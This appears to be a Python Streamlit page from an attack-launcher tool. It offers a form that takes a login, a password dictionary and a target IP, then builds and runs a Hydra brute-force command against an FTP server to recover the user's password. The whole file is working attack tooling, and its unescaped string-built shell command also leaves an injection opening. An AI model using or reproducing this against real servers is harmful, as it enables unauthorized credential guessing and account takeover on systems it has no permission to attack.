import streamlit as st
from threadManagement.ThreadManager import ThreadManager
from utils.InternetProtocolValidator import InternetProtocolValidator

attack = "Bruteforce FTP"
dictionary = ""
login = ""
threadManager = ThreadManager()
st.title(body=attack)

st.text(
    body="This attack consists in performing a dictionary attack using Hydra on a FTP server"
         " in order to get the password of a user.")

# check if attack is already in action
attackInAction = threadManager.check_running(attack=attack)
# if yes, allow attack to be stopped
if attackInAction == True:
    if not threadManager.check_for_error(attack=attack):
        if st.button("Stop attack"):
            threadManager.stop_attack(attack=attack)
            st.rerun()
else:
    # if no, allow execution
    dictionary = st.text_input(label="Dictionary", help="Absolute path to the dictionary file.")
    login = st.text_input(label="Login as", help="This will be the user the attack will use to find the password.")
    target = st.text_input(label="Target IP address", help="IP address of the FTP server")
    if st.button("Start attack"):
        print(dictionary == "")
        print(login == "")
        print(InternetProtocolValidator.is_valid_ip(ip_string=target))
        if dictionary == "" or login == "" or not InternetProtocolValidator.is_valid_ip(ip_string=target):
            st.error(body="Every field must be filled")
        else:
            command = "hydra -l " + login + " -P " + dictionary + " " + target + " -t 4 -I -V ftp -f"
            threadManager.start_attack(attack=attack, command=command)
            st.rerun()
